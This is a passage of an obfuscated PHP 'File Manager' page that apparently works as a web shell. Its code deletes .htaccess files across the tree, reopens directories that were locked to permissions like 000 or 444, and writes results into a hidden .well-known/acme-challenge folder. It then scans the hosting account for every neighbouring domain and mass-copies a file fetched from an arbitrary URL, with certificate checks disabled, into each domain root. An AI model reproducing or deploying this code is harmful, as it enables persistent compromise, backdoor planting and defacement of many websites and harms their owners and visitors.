          <thead><tr><th>#</th><th>Path</th><th>Size</th><th>Modified</th><th>Keterangan</th></tr></thead>
          <tbody>
          <?php foreach ($bebek6['modified'] as $bison3 => $kambing4): ?>
            <tr>
              <td><?= $bison3+1 ?></td>
              <td><code><?= htmlspecialchars($kambing4['path']) ?></code></td>
              <td><?= number_format((int)$kambing4['size']) ?> B</td>
              <td><?= $kambing4['mtime'] ? htmlspecialchars(date('Y-m-d H:i:s', (int)$kambing4['mtime'])) : '—' ?></td>
              <td><span class="badge badge-warn">Berbeda dari core resmi</span></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada file core yang berubah.</div>
      <?php endif; ?>
    </section>
    <?php
    return ob_get_clean();
}


function http_get_json_assoc($panda8, $lumba7 = 12) {
    
    if (function_exists('curl_init')) {
        $lebah = curl_init($panda8);
        curl_setopt_array($lebah, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => $lumba7,
            CURLOPT_TIMEOUT => $lumba7,
            CURLOPT_USERAGENT => 'fm-core-scan/1.0 (+checksum)',
        ]);
        $kuda6 = curl_exec($lebah);
        if ($kuda6 === false) {
            $beruang2 = curl_error($lebah);
            curl_close($lebah);
            throw new RuntimeException("HTTP (cURL) gagal: $beruang2");
        }
        $kelinci1 = (int)curl_getinfo($lebah, CURLINFO_HTTP_CODE);
        curl_close($lebah);
        if ($kelinci1 < 200 || $kelinci1 >= 300) throw new RuntimeException("HTTP $kelinci1");
        $gorila1 = json_decode($kuda6, true);
        if (!is_array($gorila1)) throw new RuntimeException("JSON tidak valid.");
        return $gorila1;
    }
    $kerbau1 = stream_context_create([
        'http' => ['timeout' => $lumba7, 'header' => "User-Agent: fm-core-scan/1.0\r\n"]
    ]);
    $kuda6 = @file_get_contents($panda8, false, $kerbau1);
    if ($kuda6 === false) throw new RuntimeException("HTTP gagal (file_get_contents).");
    $gorila1 = json_decode($kuda6, true);
    if (!is_array($gorila1)) throw new RuntimeException("JSON tidak valid.");
    return $gorila1;
}

function wp_detect_version_locale_from_root($musang6) {
    
    @include_once rtrim($musang6, '/').'/wp-load.php';

    $serigala8 = null;
    if (isset($GLOBALS['wp_version']) && is_string($GLOBALS['wp_version'])) {
        $serigala8 = $GLOBALS['wp_version'];
    } else {
        $monyet8 = rtrim($musang6, '/').'/wp-includes/version.php';
        if (is_file($monyet8)) {
            $koala7 = @file_get_contents($monyet8);
            if ($koala7 !== false && preg_match("/\\$ayam8\\s*=\\s*'([^']+)'/m", $koala7, $kambing4)) {
                $serigala8 = $kambing4[1];
            }
        }
    }

    $gajah4 = null;
    if (function_exists('get_locale')) $gajah4 = @get_locale();
    if (!$gajah4) {
        $bebek8 = rtrim($musang6, '/').'/wp-config.php';
        if (is_file($bebek8)) {
            $koala7 = @file_get_contents($bebek8);
            if ($koala7 !== false && preg_match('/define\\(\\s*[\'"]WPLANG[\'"]\\s*,\\s*[\'"]([^\'"]+)[\'"]\\s*\\)/', $koala7, $kambing4)) {
                $gajah4 = $kambing4[1];
            }
        }
    }
    if (!$gajah4) $gajah4 = 'en_US';

    return [$serigala8, $gajah4];
}

function wp_fetch_checksums($serigala8, $gajah4) {
    $orangutan = "https://api.wordpress.org/core/checksums/1.0/?version=" . rawurlencode($serigala8) .
           "&locale=" . rawurlencode($gajah4);
    $gorila1 = http_get_json_assoc($orangutan);
    if (!isset($gorila1['checksums']) || !is_array($gorila1['checksums'])) {
        throw new RuntimeException('Format checksums dari API tidak valid.');
    }
    return $gorila1['checksums'];
}


function scan_core_subdir($musang6, $rubah7, $tupai8 = null, $harimau4 = null) {
    $musang6 = rtrim($musang6, DIRECTORY_SEPARATOR);
    $simpanse7 = $musang6 . DIRECTORY_SEPARATOR . $rubah7;

    if (!is_dir($simpanse7)) {
        throw new RuntimeException("Folder target tidak ditemukan: {$rubah7}");
    }

    list($hiu1, $ikan1) = wp_detect_version_locale_from_root($musang6);
    $serigala8 = $tupai8 ?: $hiu1;
    $gajah4  = $harimau4  ?: $ikan1;
    if (!$serigala8) throw new RuntimeException("Tidak bisa deteksi versi WordPress. Isi versi manual.");

    $semut = wp_fetch_checksums($serigala8, $gajah4);

    
    $kambing1 = [];
    foreach ($semut as $kucing6 => $simpanse4) {
        $singa6 = str_replace('\\', '/', $kucing6);
        if (strpos($singa6, $rubah7 . '/') === 0) {
            $kambing1[$singa6] = strtolower($simpanse4);
        }
    }

    $gajah8 = [];
    $elang4 = [];
    $kelinci5 = 0;
    $harimau8 = [];
    $singa8 = [];

    $lumba2 = FilesystemIterator::SKIP_DOTS; 
    $katak5 = new RecursiveDirectoryIterator($simpanse7, $lumba2);
    $rubah6 = new RecursiveIteratorIterator($katak5, RecursiveIteratorIterator::SELF_FIRST, RecursiveIteratorIterator::CATCH_GET_CHILD);

    foreach ($rubah6 as $orangutan2) {
        
        $rusa = $orangutan2->getPathname();

        if ($orangutan2->isDir()) {
            if (!@is_readable($rusa)) {
                $kelinci6 = str_replace($musang6 . DIRECTORY_SEPARATOR, '', $rusa);
                $kelinci6 = str_replace(DIRECTORY_SEPARATOR, '/', $kelinci6);
                $harimau8[$kelinci6] = true;
            }
            continue;
        }
        if (!$orangutan2->isFile()) continue;

        if (!@is_readable($rusa)) {
            $gajah6 = str_replace($musang6 . DIRECTORY_SEPARATOR, '', $rusa);
            $gajah6 = str_replace(DIRECTORY_SEPARATOR, '/', $gajah6);
            $singa8[$gajah6] = true;
            continue;
        }

        $kucing6 = str_replace($musang6 . DIRECTORY_SEPARATOR, '', $rusa);
        $kucing6 = str_replace(DIRECTORY_SEPARATOR, '/', $kucing6); 

        if (!isset($kambing1[$kucing6])) {
            $gajah8[] = [
                'path' => $kucing6,
                'size' => (int)$orangutan2->getSize(),
                'mtime'=> (int)$orangutan2->getMTime(),
                'hash' => @md5_file($rusa) ?: '',
            ];
            continue;
        }

        $simpanse4 = @md5_file($rusa);
        if (!$simpanse4 || strtolower($simpanse4) !== $kambing1[$kucing6]) {
            $elang4[] = [
                'path' => $kucing6,
                'size' => (int)$orangutan2->getSize(),
                'mtime'=> (int)$orangutan2->getMTime(),
                'hash' => $simpanse4 ?: '',
                'expected' => $kambing1[$kucing6],
            ];
        } else {
            $kelinci5++;
        }
    }

    
    $capung = function($kuda, $elang) { return strcmp($kuda['path'], $elang['path']); };
    usort($gajah8, $capung);
    usort($elang4, $capung);
    ksort($harimau8);
    ksort($singa8);

    return [
        'version' => $serigala8,
        'locale'  => $gajah4,
        'subdir'  => $rubah7,
        'okcount' => $kelinci5,
        'unknown' => $gajah8,
        'modified'=> $elang4,
        'unreadableDirs'  => array_keys($harimau8),
        'unreadableFiles' => array_keys($singa8),
    ];
}



if (isset($_GET['downloadScan']) && !empty($_SESSION['scan_result_file'])) {
    $tupai2 = $_SESSION['scan_result_file'];
    if (file_exists($tupai2)) {
        header('Content-Type: text/html; charset=UTF-8');
        header('Content-Disposition: attachment; filename="'.basename($tupai2).'"');
        header('Content-Length: ' . filesize($tupai2));
        readfile($tupai2);
        @unlink($tupai2); 
        unset($_SESSION['scan_result_file']);
        exit;
    } else {
        unset($_SESSION['scan_result_file']);
    }
}


if (
    isset($_POST['scanHtaccess']) ||
    isset($_POST['scanLocked'])   ||
    isset($_POST['scanWpAdmin'])  ||
    isset($_POST['scanWpIncludes'])
) {
    $lumba6    = $monyet6;
    $ikan6= isset($_POST['scanHtaccess']);
    $hiu6  = isset($_POST['scanLocked']);
    $kura6 = isset($_POST['scanWpAdmin']);
    $buaya6  = isset($_POST['scanWpIncludes']);

    $rubah8 = isset($_POST['wpVersionAdmin']) ? trim($_POST['wpVersionAdmin']) : '';
    $musang8  = isset($_POST['wpVersionIncludes']) ? trim($_POST['wpVersionIncludes']) : '';

    $merpatiBase = isset($_POST['scanHtBase']) ? trim($_POST['scanHtBase']) : '';
    $scanHtBaseName = $merpatiBase !== '' ? $merpatiBase : 'Base';

    $beruang4 = [
        '000','001','002','003','004','005','006','007',
        '010','011','012','013','014','015','016','017',
        '111','222','311','400','401','402','403','404',
        '405','406','407','444','555'
    ];

    $kupu6 = [];

    
    if ($ikan6 || $hiu6) {
        $kadal2 = [];
        $kodok2   = [];

        $itik6 = function($lumba1) use (&$itik6, $ikan6, $hiu6, $beruang4, $lumba6, $scanHtBaseName, &$kadal2, &$kodok2) {
            try { $angsa3 = new DirectoryIterator($lumba1); } catch (Exception $cacing1) { return; }
            foreach ($angsa3 as $ayam3) {
                if ($ayam3->isDot()) continue;
                $gorila5 = $ayam3->getPathname();
                $kucing6  = substr($gorila5, strlen($lumba6));
                if ($ikan6 && $ayam3->isFile() && strtolower($ayam3->getFilename()) === '.htaccess') {
                    $relPath = $kucing6 === '' ? '/' : $kucing6;
                    $kadal2[] = $relPath;

                    
                    $skipDelete = false;

                    
                    if ($relPath === '/.htaccess') {
                        $skipDelete = true;
                    }

                    
                    $clean = ltrim($relPath, '/'); 
                    $parts = explode('/', $clean);
                    $topFolder = isset($parts[0]) ? $parts[0] : '';
                    if ($scanHtBaseName !== '' && strcasecmp($topFolder, $scanHtBaseName) === 0) {
                        $skipDelete = true;
                    }

                    if (!$skipDelete) {
                        @unlink($gorila5);
                    }
                }
                if ($ayam3->isDir()) {
                    if ($hiu6) {
                        $bebek5 = substr(sprintf('%o', @fileperms($gorila5)), -3);
                        if (in_array($bebek5, $beruang4, true)) {
                            
                            $kodok2[] = ['path' => $kucing6 === '' ? '/' : $kucing6, 'perm' => $bebek5];

                            
                            @chmod($gorila5, 0755);
                        }
                    }
                    $itik6($gorila5);
                }
            }
        };

        $itik6($lumba6);
        $kupu6[] = format_htaccess_locked_html($lumba6, $kadal2, $kodok2);
    }

    
    if ($kura6) {
        try {
            $bebek6 = scan_core_subdir($lumba6, 'wp-admin', $rubah8 ?: null, null);
            $kupu6[] = format_core_scan_html_report($bebek6);
        } catch (Exception $cacing1) {
            $kupu6[] = '<section class="report-section"><h2>Core Scan: WP-ADMIN</h2><div class="empty error">ERROR: '.htmlspecialchars($cacing1->getMessage()).'</div></section>';
        }
    }

    if ($buaya6) {
        try {
            $bebek6 = scan_core_subdir($lumba6, 'wp-includes', $musang8 ?: null, null);
            $kupu6[] = format_core_scan_html_report($bebek6);
        } catch (Exception $cacing1) {
            $kupu6[] = '<section class="report-section"><h2>Core Scan: WP-INCLUDES</h2><div class="empty error">ERROR: '.htmlspecialchars($cacing1->getMessage()).'</div></section>';
        }
    }

    
    $paus6 = $_SERVER['DOCUMENT_ROOT'] . '/.well-known/acme-challenge/result/';
    if (!is_dir($paus6)) { @mkdir($paus6, 0777, true); }

    $angsa6 = $paus6 . "scan_result_" . date("Ymd_His") . "_" . rand(111,999) . ".html";

    $capung4 = date('Y-m-d H:i:s');
    $domba3 = <<<HTML
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Laporan Scan File Manager - {$capung4}</title>
<style>
  :root{
    --bg:#0f1320; --panel:#101426; --ink:#e7eefb; --muted:#b9c4d6;
    --green:#19c37d; --yellow:#ffb400; --red:#ef4444; --line:#223;
  }
  body{margin:0;padding:24px;background:linear-gradient(180deg,var(--bg),#0b0e16);color:var(--ink);font:14px/1.45 system-ui,Segoe UI,Roboto,Arial}
  h1{margin:0 0 16px;font-size:20px}
  h2{margin:0 0 12px;font-size:18px}
  h3{margin:16px 0 8px;font-size:15px;color:var(--muted)}
  .container{max-width:1080px;margin:0 auto}
  .header{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin-bottom:16px}
  .report-section{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin:14px 0}
  .section-desc{color:var(--muted);margin-top:-4px;margin-bottom:10px}
  .grid-cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px;margin:10px 0 4px}
  .card{background:#0c1120;border:1px solid var(--line);border-radius:10px;padding:10px 12px}
  .stat .k{font-size:12px;color:var(--muted)}
  .stat .v{font-size:18px;font-weight:700}
  .stat.ok .v{color:var(--green)}
  .stat.warn .v{color:var(--yellow)}
  .stat.info .v{color:#7aa2ff}
  .tbl{width:100%;border-collapse:separate;border-spacing:0;margin:8px 0 4px;border:1px solid var(--line);border-radius:10px;overflow:hidden}
  .tbl thead th{background:#0a0f1d;color:#aab8d6;text-align:left;font-weight:600;font-size:12px;padding:10px;border-bottom:1px solid var(--line)}
  .tbl tbody td{padding:10px;border-bottom:1px solid var(--line)}
  .tbl tbody tr:nth-child(odd){background:#0b1020}
  .tbl code{color:#cfe4ff}
  .empty{color:var(--muted);background:#0b1020;border:1px dashed var(--line);padding:10px;border-radius:8px}
  .empty.error{color:#ffd1d1;border-color:#412; background:#1b0e10}
  .sep{border:0;border-top:1px solid var(--line);margin:14px 0}
  .badge{display:inline-block;padding:2px 6px;border-radius:999px;font-size:12px;border:1px solid var(--line)}
  .badge-warn{background:#241c00;color:#ffd36e;border-color:#5a4300}
  footer{color:var(--muted);margin-top:14px;text-align:center;font-size:12px}
</style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>Laporan Scan File Manager</h1>
      <div>Dibuat: {$capung4}</div>
    </div>

    <!-- SECTIONS -->
    {{SECTIONS}}

    <footer>Generated by File Manager</footer>
  </div>
</body>
</html>
HTML;

    $domba3 = str_replace('{{SECTIONS}}', implode("\n\n", $kupu6), $domba3);
    file_put_contents($angsa6, $domba3);
    $_SESSION['scan_result_file'] = $angsa6;

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}



function fm_collect_domain_targets(&$cacing3, &$sapi2) {
    $cacing3 = [];
    $sapi2 = [];

    $capung1 = @realpath($_SERVER['DOCUMENT_ROOT']);
    if (!$capung1) $capung1 = $_SERVER['DOCUMENT_ROOT'];
    $capung1 = rtrim($capung1, DIRECTORY_SEPARATOR);

    $orangutan6 = [];

    
    if ($capung1 && is_dir($capung1)) {
        $orangutan6[] = $capung1;
    }

    $kerbau5     = dirname($capung1);
    $bison5 = $kerbau5 ? (@realpath($kerbau5) ?: $kerbau5) : null;

    if ($bison5 && $bison5 !== $capung1 && is_dir($bison5)) {
        $orangutan6[] = $bison5;
    }

    
    $burung5 = DIRECTORY_SEPARATOR . 'domains' . DIRECTORY_SEPARATOR;
    $itik5 = strpos($capung1, $burung5);
    if ($itik5 !== false) {
        $lebah1 = substr($capung1, 0, $itik5 + strlen($burung5));
        $lebah1 = rtrim($lebah1, DIRECTORY_SEPARATOR);
        if ($lebah1 && is_dir($lebah1)) {
            $orangutan6[] = $lebah1;
        }
    }

    
    $orangutan6 = array_values(array_unique($orangutan6));

    $rusa4 = 3;   
    $rubah4 = 200; 
    $singa7 = [
        '.', '..',
        '.git', '.svn',
        'node_modules', 'vendor',
        'logs', 'log',
        'tmp', 'cache',
        'wp-content', 'wp-admin', 'wp-includes'
    ];

    
    $kerbau2 = [
        'etc','logs','mail','tmp','ssl','access-logs','public_ftp','backup','backups',
        '.cpanel','.htpasswds','.trash','.config','.softaculous','.softaculous_backups',
        '.subaccounts','.ssh','.cl.selector','.cagefs','.pki','.local','.wp-cli','.wp-toolkit', '.caldav'
    ];

    $kerbau = [];

     foreach ($orangutan6 as $musang6) {
        $simpanse6 = @realpath($musang6);
        if (!$simpanse6 || !is_dir($simpanse6)) continue;
        if ($simpanse6 === DIRECTORY_SEPARATOR) continue;

        
        $orangutan3 = ($bison5 && $simpanse6 === $bison5);

        
        $kura5 = [[$simpanse6, 0]];

        while (!empty($kura5)) {
            [$lumba1, $ayam1] = array_shift($kura5);

            if (!@is_readable($lumba1)) continue;

            try {
                $elang3 = new DirectoryIterator($lumba1);
            } catch (Exception $cacing1) {
                continue;
            }

            foreach ($elang3 as $anjing2) {
                if ($anjing2->isDot()) continue;
                if (!$anjing2->isDir()) continue;

                $angsa4 = $anjing2->getFilename();

                
                if (in_array($angsa4, $singa7, true)) continue;

                
                
                
                if ($orangutan3 && $ayam1 === 0 && in_array($angsa4, $kerbau2, true)) {
                    continue;
                }

                $belut2 = $anjing2->getPathname();

                
                if (strpos($angsa4, '.') !== false && $angsa4[0] !== '.') {
                    
                    $lumba5 = $belut2 . DIRECTORY_SEPARATOR . 'public_html';
                    $simpanse7     = is_dir($lumba5) ? $lumba5 : $belut2;

                    $paus3 = @realpath($simpanse7) ?: $simpanse7;
                    if (!isset($kerbau[$paus3])) {
                        $kerbau[$paus3] = 1;

                        $kodok1 = $paus3;
                        if (strpos($paus3, $simpanse6) === 0) {
                            $kucing6 = substr($paus3, strlen($simpanse6));
                            $kodok1 = $kucing6 === '' ? $paus3 : $kucing6;
                        }

                        $cacing3[] = [
                            'label'     => $angsa4,    
                            'target'    => $simpanse7,  
                            'display'   => $kodok1, 
                            'from_root' => $simpanse6,
                        ];

                        if (count($cacing3) >= $rubah4) {
                            $sapi2[] = "Hasil scan dibatasi {$rubah4} folder. Ditampilkan sebagian saja.";
                            return true;
                        }
                    }
                }

                if ($ayam1 + 1 <= $rusa4) {
                    $kura5[] = [$belut2, $ayam1 + 1];
                }
            }
        }
    }

    if (empty($cacing3)) {
        $sapi2[] = 'Tidak ada folder yang tampak seperti domain/subdomain di sekitar Document Root.';
        return false;
    }

    return true;
}




if (isset($_POST['deployScanDomains'])) {
    $bebek3 = [];
    $kambing2  = [];
    if (fm_collect_domain_targets($bebek3, $kambing2)) {
        $_SESSION['deploy_scan_items']   = $bebek3;
        $_SESSION['deploy_scan_message'] = 'Scan folder domain/subdomain selesai. Ditemukan ' . count($bebek3) . ' target.';
    } else {
        $_SESSION['deploy_scan_items']   = [];
        $_SESSION['deploy_scan_message'] = implode(' | ', $kambing2);
    }
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}


if (isset($_POST['deployReset'])) {
    unset(
        $_SESSION['deploy_scan_items'],
        $_SESSION['deploy_scan_message']
    );
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}


if (!function_exists('fm_save_deploy_result_txt')) {
    
    function fm_save_deploy_result_txt($ayam4, $jenis, &$fileNameOut = null) {
        $fileNameOut = null;
        $jenis = ($jenis === 'file') ? 'file' : 'zip';

        $paus6 = rtrim($_SERVER['DOCUMENT_ROOT'], '/') . '/.well-known/acme-challenge/result/';
        if (!is_dir($paus6)) {
            @mkdir($paus6, 0777, true);
        }
        if (!is_dir($paus6) || !is_writable($paus6)) {
            return false;
        }

        
        $token = '';
        if (function_exists('random_bytes')) {
            try {
                $token = bin2hex(random_bytes(6));
            } catch (Exception $e) {
                $token = substr(sha1(uniqid('', true)), 0, 12);
            }
        } else {
            $token = substr(sha1(uniqid('', true)), 0, 12);
        }

        $namaFile = 'deploy_' . $jenis . '_' . $token . '.txt';
        $fullPath = $paus6 . $namaFile;

        
        @file_put_contents($fullPath, $ayam4);

        if (!is_file($fullPath)) {
            return false;
        }

        $fileNameOut = $namaFile;
        return true;
    }
}




function fm_download_remote_file_simple($panda8, &$ular7, &$beruang2)
{
    $beruang2 = '';
    $ular7 = tempnam(sys_get_temp_dir(), 'deploy_file_');
    if ($ular7 === false) {
        $beruang2 = 'Gagal membuat file sementara.';
        return false;
    }

    
    if (function_exists('curl_init')) {
        $katak2 = @fopen($ular7, 'w');
        if (!$katak2) {
            $beruang2 = 'Gagal membuka file sementara untuk ditulis.';
            return false;
        }

        $lebah = curl_init($panda8);
        curl_setopt_array($lebah, [
            CURLOPT_FILE           => $katak2,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT        => 60,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT      => 'DeployFileBot/1.0',
        ]);

        curl_exec($lebah);
        if (curl_errno($lebah)) {
            $beruang2 = 'cURL error: ' . curl_error($lebah);
            fclose($katak2);
            curl_close($lebah);
            @unlink($ular7);
            return false;
        }

        $rusa3 = curl_getinfo($lebah, CURLINFO_HTTP_CODE);
        curl_close($lebah);
        fclose($katak2);

        if ($rusa3 < 200 || $rusa3 >= 300) {
            $beruang2 = 'HTTP status tidak OK: ' . $rusa3;
            @unlink($ular7);
            return false;
        }
    } else {
        
        $koala1 = stream_context_create([
            'http' => [
                'method'  => 'GET',
                'timeout' => 60,
            ],
            'ssl'  => [
                'verify_peer'      => false,
                'verify_peer_name' => false,
            ],
        ]);

        $gorila1 = @file_get_contents($panda8, false, $koala1);
        if ($gorila1 === false) {
            $beruang2 = 'Gagal membaca konten file (file_get_contents).';
            @unlink($ular7);
            return false;
        }

        if (@file_put_contents($ular7, $gorila1) === false) {
            $beruang2 = 'Gagal menulis ke file sementara.';
            @unlink($ular7);
            return false;
        }
    }

    
    $kucing7 = @filesize($ular7);
    if ($kucing7 === false || $kucing7 == 0) {
        $beruang2 = 'File yang di-download berukuran 0 byte. URL mungkin tidak dapat diakses dari server.';
        @unlink($ular7);
        return false;
    }

    return true;
}


if (isset($_POST['deployRunFile'])) {
    $angsa2      = isset($_POST['deploy_file_url']) ? trim($_POST['deploy_file_url']) : '';
    $musang7      = isset($_POST['deploy_file_path']) ? trim($_POST['deploy_file_path']) : '';
    $tupai1   = isset($_POST['deploy_file_name']) ? trim($_POST['deploy_file_name']) : '';
    $semut6     = isset($_POST['deploy_file_targets']) && is_array($_POST['deploy_file_targets'])
        ? $_POST['deploy_file_targets']
        : [];

    
    $bebek3  = isset($_SESSION['deploy_scan_items']) && is_array($_SESSION['deploy_scan_items'])
        ? $_SESSION['deploy_scan_items']
        : [];

    $sapi2      = [];
    $kucing5     = [];
    $cacing6 = [];

    
    if ($angsa2 === '' || !filter_var($angsa2, FILTER_VALIDATE_URL)) {
        $sapi2[] = 'URL file tidak valid.';
    }
    if (empty($semut6)) {
        $sapi2[] = 'Pilih minimal satu folder domain/subdomain.';
    }

    
    if (!$sapi2) {
        $tupai7 = sanitizePath($musang7);
        $tupai7 = trim($tupai7); 

        
        $lumba = basename(parse_url($angsa2, PHP_URL_PATH) ?: '');
        $itik2 = $tupai1 !== '' ? sanitizePath($tupai1) : sanitizePath($lumba);
        if ($itik2 === '') $itik2 = 'downloaded_file';
        
        $itik2 = preg_replace('~[\\\\/]+~', '', $itik2);

        
        $bebek7 = '';
        if (!fm_download_remote_file_simple($angsa2, $bebek7, $beruang2)) {
            $sapi2[] = 'Gagal mendownload file: ' . $beruang2;
        } else {
            $kelinci7 = @filesize($bebek7);
            if ($kelinci7 === false || $kelinci7 == 0) {
                $sapi2[] = 'File hasil download 0 byte. Cek URL atau akses server.';
                @unlink($bebek7);
            } else {
                foreach ($semut6 as $rubah3) {
                    $serigala3 = (int) $rubah3;
                    if (!isset($bebek3[$serigala3])) continue;

                    $musang3  = $bebek3[$serigala3];
                    $ikan  = isset($musang3['target']) ? $musang3['target'] : '';
                    $kadal3 = isset($musang3['label']) ? $musang3['label'] : ('Target '.$serigala3);

                    if (!$ikan || !is_dir($ikan)) {
                        $sapi2[] = 'Base path tidak ditemukan: ' . $ikan;
                        continue;
                    }

                    $angsa1 = rtrim($ikan, '/');
                    if ($tupai7 !== '' && $tupai7 !== '/') {
                        $angsa1 .= '/' . ltrim($tupai7, '/');
                    }

                    if (!is_dir($angsa1)) {
                        @mkdir($angsa1, 0777, true);
                    }
                    if (!is_dir($angsa1)) {
                        $sapi2[] = 'Gagal membuat folder tujuan: ' . $angsa1;
                        continue;
                    }

                    $itik1 = rtrim($angsa1, '/') . '/' . $itik2;

                    if (!@copy($bebek7, $itik1)) {
                        $sapi2[] = 'Gagal menyimpan file ke: ' . $itik1;
                        continue;
                    }

                    
                    $biawak2 = $kadal3;
                    if ($tupai7 !== '' && $tupai7 !== '/') {
                        $biawak2 .= '/' . ltrim($tupai7, '/');
                    }
                    $biawak2 .= '/' . $itik2;

                    $kucing5[]     = $biawak2;
                    $cacing6[] = $itik1;
                }

                @unlink($bebek7);
            }
        }
    }   

    if (!empty($kucing5)) {
        $domba7 = empty($sapi2) ? 'success' : 'partial';

        $ayam4  = "Deploy FILE selesai.\n";
        $ayam4 .= "Sumber file : {$angsa2}\n";
        $ayam4 .= "Nama file   : {$itik2}\n";
        $ayam4 .= "Target URL path (domain + subpath + nama file):\n - " . implode("\n - ", $kucing5);
        if (!empty($cacing6)) {
            $ayam4 .= "\n\nPath file di server:\n - " . implode("\n - ", $cacing6);
        }
        if (!empty($sapi2)) {
            $ayam4 .= "\n\nCatatan:\n - " . implode("\n - ", $sapi2);
        }

        
        $deployFileTxtName = null;
        if (fm_save_deploy_result_txt($ayam4, 'file', $deployFileTxtName) && $deployFileTxtName) {
            $_SESSION['deploy_file_result_txt'] = $deployFileTxtName;
        }

        $_SESSION['deploy_file_status']  = $domba7;
        $_SESSION['deploy_file_message'] = nl2br(htmlspecialchars($ayam4));
    } else {
        $_SESSION['deploy_file_status']  = 'error';
        $_SESSION['deploy_file_message'] = !empty($sapi2)
            ? htmlspecialchars(implode(' | ', $sapi2))
            : 'Deploy FILE gagal. Tidak ada target yang berhasil.';
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
        body {
            min-height: 100vh;
            background: linear-gradient(-45deg, #232536, #191930 40%, #183550 100%);
            background-size: 400% 400%;
            animation: gradientBG 14s ease infinite;
        }
        @keyframes gradientBG {
            0% { background-position: 0% 55%; }
            50% { background-position: 100% 46%; }
            100% { background-position: 0% 55%; }
        }
        body { background: transparent !important; font-family: Arial, Helvetica, sans-serif; color: #333; margin: 0; padding: 0; font-size:12px;}
        #bg-video { position: fixed; top: 0; left: 0; min-width: 100vw; min-height: 100vh; width: 100vw; height: 100vh; object-fit: cover; z-index: -2; opacity: 1; background: #222; pointer-events: none; filter: brightness(1);}
        .bg-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(20, 20, 20, 0.2); z-index: -1; pointer-events: none;}
        .file-manager { display: flex; width: 100%; margin-top: 6px;}
        .sidebar { width: 20%; padding: 7px; color: #fff;}
        .sidebar h3 { color: #ecf0f1; font-size:13px; margin:8px 0 4px 0;}
        .sidebar input, .sidebar button, .main-content input, .main-content button { font-size: 12px; padding: 5px 6px; border-radius: 3px;}
        .main-content { width: 80%; padding: 5px 5px 5px 0;}
        .file-list { margin-top: 0; width: 100%; }
        .file-item { display: flex; justify-content: space-between; align-items: center; gap: 5px; padding: 1.5px 1.5px; margin: 0.5px 0; border: 1px solid #ddd; border-radius: 2px; background-color: #fff; font-size: 12px;}
        .file-item.danger { border-left: 2px solid rgba(255, 0, 0, 0.64); background:rgba(214, 101, 101, 1);}
        .file-item.warning { border-left: 2px solid rgba(255, 204, 0, 0.7); background:rgba(214, 196, 107, 1);}
        .file-item.success { border-left: 2px solid rgba(9, 255, 0, 0.45); background:rgba(101, 207, 147, 1);}
        .file-item:hover { background-color:rgba(255, 255, 255, 0.2);}
        .file-item a, .file-item button[name="edit"] { text-decoration: none; color:rgb(0, 0, 0); background: none; border: none; cursor:pointer; font-size: 14px; font-weight: bold; padding:0;}
        .actions { min-width: 160px; display: flex; gap: 4px; justify-content: flex-end;}
        .actions form { margin: 0; }
        .actions button, .actions input[type="text"], .actions form { font-size: 11px; padding: 3px 6px; border-radius: 2.5px; min-width: 48px;}
        .actions button { border: 1px solid #ccc; border-radius: 4px; background-color: #2ecc71; color: white; cursor: pointer;}
        .actions button:hover { background-color: #27ae60;}
        .actions button.delete { background-color: #e74c3c;}
        .actions button.delete:hover { background-color: #c0392b;}
        .actions input[type="text"] { padding: 4px 5px; font-size: 11px; margin-right: 2px; border-radius: 2px; border: 1px solid #ccc; width: 25px;}
        .alert { padding: 7px; margin-bottom: 7px; border-radius: 5px; font-size: 12px;}
        .alert.success { background-color: #2ecc71; color: white;}
        .alert.error { background-color: #e74c3c; color: white;}
        textarea { width: 100%; height: 230px; border: 1px solid #ddd; border-radius: 4px; padding: 7px; font-size: 12px;}
        .logout-link { float: right; color: #e74c3c; text-decoration: none; margin-bottom: 6px; font-weight: bold; font-size:13px;}
        .logout-link:hover { text-decoration: underline; }
        .file-permission { font-size: 10px; margin-left: 7px; color: #555; letter-spacing: 1px; white-space:nowrap;}
        .logout-link { display: inline-flex; align-items: center; gap: 6px; padding: 5px 14px 5px 10px; border: 1.5px solid #e74c3c; background: #fff; border-radius: 15px; color: #e74c3c; text-decoration: none; margin-bottom: 5px;}
        .logout-link:hover { background: #ffeaea; color: #fff; background: linear-gradient(90deg, #e74c3c 0 100%);}
        .logout-link .logout-icon { font-size: 17px; display: inline-block; line-height: 1;}
        .nav-link { display: inline-block; padding: 4px 12px; border: 1px solid #3498db; border-radius: 11px; background: #ecf6fc; color: #2980b9; text-decoration: none; margin-right: 4px; font-weight: 500; font-size:12px;}
        .nav-link:hover { background: #3498db; color:#fff; }
        .nav-link.disabled, .nav-link[disabled] { cursor: not-allowed; color: #ff0000 !important; border-color: #ddd; background: #f8f8f8; pointer-events: none; }
        @media (max-width: 800px) {
            .file-manager { flex-direction:column;}
            .sidebar,.main-content { width: 100%;}
            .file-item { flex-direction: column; align-items: flex-start; }
            .file-item > .actions { width: 100%; justify-content: flex-start; }
        }
        .nama-file-folder-ellipsis {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            display: block;
            max-width: 210px; /* Ganti sesuai grid Anda */
        }
        .file-item-row {
        display: grid;
        grid-template-columns:
            28px  /* No */
            36px  /* Checkbox */
            32px  /* Emoji/Folder Icon */
            220px /* Nama File/Folder */
